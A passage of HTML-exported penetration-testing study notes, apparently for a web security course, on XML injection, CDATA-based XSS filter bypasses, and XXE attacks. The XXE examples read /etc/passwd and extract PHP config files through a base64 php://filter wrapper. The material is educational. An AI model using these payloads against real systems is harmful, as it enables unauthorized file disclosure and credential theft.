+</code></pre><h2 id="bd64b424-2fdb-4307-ac27-be6ed960f9a9" class=""><strong>Texting XML Injection</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#texting-xml-injection"></a></strong></h2><h3 id="37e50da0-1323-4fc7-9d05-553d8c08cc24" class=""><strong>Single/Double Quotes</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#singledouble-quotes"></a></strong></h3><p id="3d546677-7db4-4e59-b0b3-9b74c118520c" class="">Single and Double quotes are used to define an attribute value in the tag:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e92b08f3-a8c9-4366-b121-8caaaafe7d31" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;group id=&quot;id&quot;&gt;admin&lt;/group&gt;  &lt;group id=&#x27;id&#x27;&gt;admin&lt;/group&gt;
+</code></pre><p id="7cd73d1c-a186-4e3a-8913-26e934cdb73d" class="">An <em>ID</em> like the following, will make the XML incorrect:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d29ba922-ddf8-488f-ae55-f07c11c1fa58" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;group id=&quot;12&quot;&quot;&gt;admin&lt;/group&gt;  &lt;group id=&#x27;12&#x27;&#x27;&gt;admin&lt;/group&gt;      &quot;
+# duplicating the Quotes
+</code></pre><h3 id="c09ed141-5579-4d75-ad97-f5bed4e3461d" class=""><strong>Ampersand &amp;</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#ampersand-"></a></strong></h3><p id="4ba5c32d-194b-45d0-bec4-56dbd695a046" class="">Its used to represent entities:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="04c622c2-2fbf-4e19-8048-fd11aaf01315" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&amp;EntityName;
+</code></pre><ul id="c1ced200-ad5e-4d9f-9945-67e261aa57cd" class="bulleted-list"><li style="list-style-type:disc">By injecting <strong>&amp;name;</strong>, we can trigger an error if the entity is not defined. Additionaly, we can attempt to remove the final <strong>;</strong>, generating a malformed XML structure.</li></ul><h3 id="7ca1e3e2-912e-4ae4-968c-042e2402622d" class=""><strong>Angular Parentheses</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#angular-parentheses"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a229c4a-14f9-4be6-b6e1-6d8933cbd3b5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt; &gt;
+</code></pre><p id="4c32a9cd-735a-449a-91dc-27347eebf2ab" class="">Using angular parentheses, we can begin to define several areas within the XML document such as tag names, comments, and CDATA sections:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="db2bd002-80d0-46c8-9230-fdd55b75bbff" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;tagname&gt; &lt;!-- --&gt; &lt;![CDATA[value]]&gt;
+</code></pre><h3 id="fc46045f-0dd3-462e-8ed6-d6953ae609c9" class=""><strong>XSS with CDATA</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#xss-with-cdata"></a></strong></h3><p id="baa3affc-0a4c-4a7e-b5e2-730d8882327d" class="">We can also try exploiting the XML parser, thereby introducing both a possible XSS attack vector and possibly bypassing a weak filter.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4208b46f-4016-4983-8625-8b2ba3f6997e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;&lt;![CDATA[alert]]&gt;(&#x27;XSS&#x27;)&lt;/script&gt;
+</code></pre><p id="be53b70d-49bd-4319-98f9-a9372847429b" class="">During XML processing, the CDATA section is eliminated, generating the infamous XSS payload</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7e7e362f-4fac-4934-af59-4d9d4330525c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+</code></pre><p id="4a434393-a47f-4087-88f0-07dbc7044276" class="">Its possible to escape angular parentheses:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22980686-27a1-4122-a475-5f57e25b96f4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert(&#x27;XSS&#x27;)&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;
+</code></pre><p id="0ace3b74-13f9-4ab1-90fd-3154fd32d116" class="">Equals:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="be576d47-7544-4f64-a1e5-b32a1495eceb" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+</code></pre><h2 id="076b6a26-4deb-429e-af2f-9137813f72c6" class=""><strong>XML External Entity</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#xml-external-entity"></a></strong></h2><p id="b3f4be8f-7ca5-4fb8-9213-b9be2a307a66" class="">Consist of injecting external entities into the document definition; This type of attack is known as <strong>XXE</strong> (XML eXternal Entities)</p><ul id="3b411aaa-16ea-4bb8-8fdc-e19d5c1d88e3" class="bulleted-list"><li style="list-style-type:disc">In general, the idea is to tell XML parsers to load externally defined entities, therefore making it possible to access sensitive content stored on the vulnerable host.</li></ul><h3 id="f2f6ac15-ff2b-4348-a4ed-d062f6091476" class=""><strong>Taxonomy</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#taxonomy"></a></strong></h3><p id="fcce4aa3-07e8-4690-b3a5-b36257002387" class="">Two types:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="052a4154-1e42-4527-a012-e1253d4ceb71" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Private
+- Public
+</code></pre><ul id="9038e09e-40e0-4060-81d7-7eecb0ab41b1" class="bulleted-list"><li style="list-style-type:disc">Private external entities</li></ul><ul id="d7c20f58-e718-4cd7-98b8-ccc2f438cb29" class="bulleted-list"><li style="list-style-type:disc">Are restricted to either a single author or group of authors</li></ul><p id="3cccdac0-ca86-414e-b469-b7c5e5ddf5c3" class="">Public:</p><p id="bcf1b1b4-0696-4409-b6a6-d03e742851d6" class="">Was designed For a broader usage:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="37d21fc7-ff36-4e79-9038-2a6fe49127ce" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY name SYSTEM &quot;URI&quot;&gt; //private
+&lt;!ENTITY name PUBLIC &quot;PublicID&quot; &quot;URI&quot;&gt; //public
+</code></pre><ul id="f7a2836d-6ba2-4520-877e-d9f9b0e506cd" class="bulleted-list"><li style="list-style-type:disc">Important to note that the URI field does not limit XML parses from resolving HTTPs protocols only</li></ul><ul id="a8b7eb53-a154-4e09-9b25-2da3d03d7375" class="bulleted-list"><li style="list-style-type:disc">There are a number of valid <strong>URI schemes</strong> allowed (FILE, FTP, DNS, PHP, etc)</li></ul><p id="b035fcec-d873-423d-9bb5-d6eb0ade18e9" class="">→ http://en.wikipedia.org/wiki/URI_scheme</p><p id="25ac401a-fbad-431a-9ad1-977e17d838b4" class="">With external entities, we can create <strong>dynamic references</strong> in the document</p><ul id="ec616743-2199-45d0-953a-0ec54f6f2dde" class="bulleted-list"><li style="list-style-type:disc">The most dangerous are the private ones, because they allow us to disclose local system files, play with network schemes, manipulate internal applications, etc.</li></ul><h3 id="98cbe59b-7631-41ec-8529-b18ad0ef5c8c" class=""><strong>Resource Inclusion</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#resource-inclusion"></a></strong></h3><p id="5aed4026-67b7-4bdc-b256-89988790c60b" class="">The attacker uploads/crafts a malicious XML file</p><p id="e5b2f8f6-192c-427b-badc-ff3b2e355094" class="">This includes an external entity definition that points to a local file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19cc5126-84e8-411f-9f6e-069176a5a62a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY xxefile SYSTEM &quot;file:///etc/passwd&quot;&gt;
+</code></pre><p id="08552dbf-df07-424e-8407-d082bfca5307" class="">Then in the body of the XML request, they add the reference to the created entity:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fb4cb1ee-e51b-45ac-9586-9bc35600412b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;body&gt;&amp;xxefile;&lt;/body&gt;
+</code></pre><figure id="aa9b43aa-3855-4cec-9a7d-fd134000700f" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/5.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/5.png"/></a></figure><figure id="88499a3d-9c2d-4079-80e9-23030d4e820f" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/6.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/6.png"/></a></figure><figure id="d2ae0c29-f504-412c-b1e9-792ca63f21de" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/7.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/7.png"/></a></figure><ul id="a3f19b06-91f2-460f-8e62-21196caaa470" class="bulleted-list"><li style="list-style-type:disc">Once the receiver reads the message, he will not only see the body of the message, but also the content of the external entity &amp;xxefile;(/etc/passwd file)</li></ul><h3 id="9da9dc85-f4cc-4183-94f4-beaf52f21f48" class=""><strong>Resource Inclusion - Improved</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#resource-inclusion---improved"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="08341c8d-03d2-4c7e-bcd9-97bc1c331726" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&amp; &lt; &gt; are special characters and will cause errors
+</code></pre><ul id="8da9e28b-b0ee-4232-8d9c-9709e5d9ec57" class="bulleted-list"><li style="list-style-type:disc">lets see more examples</li></ul><p id="59e83ae1-1b3c-4ce2-a709-f8f0b56c719d" class="">We want to access a php config file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8df05041-ad69-45a4-a411-416961339b4d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+&amp;config=array();
+&amp;config[&#x27;username&#x27;] = &#x27;hiddenuser&#x27;;
+&amp;config[&#x27;password&#x27;] = &#x27;mysuperpassword&#x27;;
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5aa2edec-5619-4e30-a998-e5f07813fc85" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">In case we try to use the classic technique to extract the resource via XXE,
+it will fail because is has special characters such as &gt; and &amp;
+</code></pre><ul id="e84d5626-7fb1-4a2c-ba6a-1b71db8be9b9" class="bulleted-list"><li style="list-style-type:disc">even with <strong>[CDATA] bypass</strong> it will fail</li></ul><p id="2b1e2d24-899f-45f0-ba50-3be80d8d55fa" class="">Parameters Entities</p><p id="9bc0646f-a0c5-4771-a96c-b2d49940142a" class="">→ https://www.w3.org/TR/xml/#dt-PE</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="006579e6-c576-4b73-aa08-911d4457bbd2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY % name &quot;value&quot;&gt;
+&lt;!ENTITY % name SYSTEM &quot;URI&quot;&gt;
+&lt;!ENTITY % name PUBLIC &quot;PublicID&quot; &quot;URI&quot;&gt;
+</code></pre><h3 id="9f6e7195-dbb4-4993-8ca3-752f74471e3e" class=""><strong>CDATA Escape Using Parameter Entities</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#cdata-escape-using-parameter-entities"></a></strong></h3><p id="7b2faf20-7d37-4934-9fba-25582c2fcd41" class="">By both using the CDATA bypass and Parameter Entities its possible to retrieve the resource content</p><figure id="77c5e6b9-ab74-4517-a54c-fca48c0a4dfe" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/8.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/8.png"/></a></figure><p id="afddba6f-9fe3-4f7b-b8b7-7b763fe95b88" class="">It works in major XML parsers</p><p id="ba5436fe-05ed-4efc-a95a-6d95db464180" class="">But in PHP there is an alternative: Built-in Wrapper</p><p id="7723eb4c-f099-4cd7-ac5a-09902639f3eb" class="">→ http://php.net/manual/en/wrappers.php.php</p><h3 id="5800605b-2940-4d5a-b7ef-e02b7f370955" class=""><strong>php://I/O streams</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#phpio-streams"></a></strong></h3><p id="7e187b61-d60a-4f41-896f-91f11470f642" class="">→ php://filter</p><p id="38310476-df87-4da4-9fdc-6f42cfdb396f" class="">This is a kind of meta-wrapper designed to convert the application filters to a stream at the time of opening</p><p id="600029fb-3c8c-4b6e-9670-83cd2f7c2c7a" class="">→ http://php.net/manual/en/filters.php</p><blockquote id="15f6dae9-1ae8-467a-8d97-4416f873f45e" class="">In order to avoid XML parsing errors, we need a filter that reads the target file and then converts the content into a format that is harmless to the XML structure</blockquote><figure id="72e5fc32-c03f-4b70-a339-f421ab6dcedc" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/9.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/9.png"/></a></figure><p id="da8b432c-5208-4d54-a225-c7395e4d5be8" class="">Base64:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="99fad962-15a0-4ee4-8548-b212f556158c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">php://filter/read=conver.base64-encode/resource=/path/to/config.php
+</code></pre><h3 id="8c379204-3d82-4683-960a-e1535a31bf10" class=""><strong>Bypassing Access Controls</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#bypassing-access-controls"></a></strong></h3><p id="9d6e0da6-cf73-4267-9bb5-03bf349c710f" class="">Lets improve the previous PHP config file by adding an access restriction to a local server IP addresses</p><figure id="aa40d85c-ddad-4bbe-bd55-b2bf1a112103" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/10.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/10.png"/></a></figure><p id="76885e89-be1d-4375-ae39-8bc9456432b4" class="">If we attempt to access it from the web, an <strong>ACCESS DENIED</strong> page will be displayed</p><ul id="d077bd94-36fa-4969-911e-76776a80ae7a" class="bulleted-list"><li style="list-style-type:disc">However, if the frontend is vulnerable to XXE, we can exploit the flaw and steal the page content.</li></ul><h3 id="3fc824f9-a1de-4c3d-b867-9c9cb7673701" class=""><strong>Out-of-Band Data Retrieval</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#out-of-band-data-retrieval"></a></strong></h3><p id="daf22e0c-280c-49cc-8e61-a07da6a03be2" class="">This OOB technique we can use when we cant to extract file contents without any direct output.</p><figure id="53e43e0d-3d2c-409b-990c-beccd5ca4862" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/11.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/11.png"/></a></figure><figure id="c6ad0b33-3402-4971-a71f-bbcf6f723786" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/12.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/12.png"/></a></figure><p id="9a72dac4-1e28-443d-beb5-4d9b572d8397" class="">To assist in the exploitation of this technique:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c2909a2b-a794-4924-b482-856d3f1ef3d4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://github.com/joernchen/xxeserve
+</code></pre><p id="56a928a2-94ef-42e8-a411-165baec27637" class="">Its an app that runs a server which is useful in collecting data sent out of band</p><ul id="5422fc17-9704-4a24-b836-07673660e00f" class="bulleted-list"><li style="list-style-type:disc">example using XXEServe in images</li></ul><h3 id="8ae41c4a-526b-4b7f-81aa-edde4ffe9725" class=""><strong>Note from Video</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#note-from-video"></a></strong></h3><h3 id="4828fcf0-92fd-43d3-840d-1ef1083349f0" class=""><strong>1</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#1"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7489a275-2e1a-4a38-9ba7-9432587c9409" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!DOCTYPE test [
+&lt;!ENTITY fakeEntity SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+...
+&amp;fakeEntity
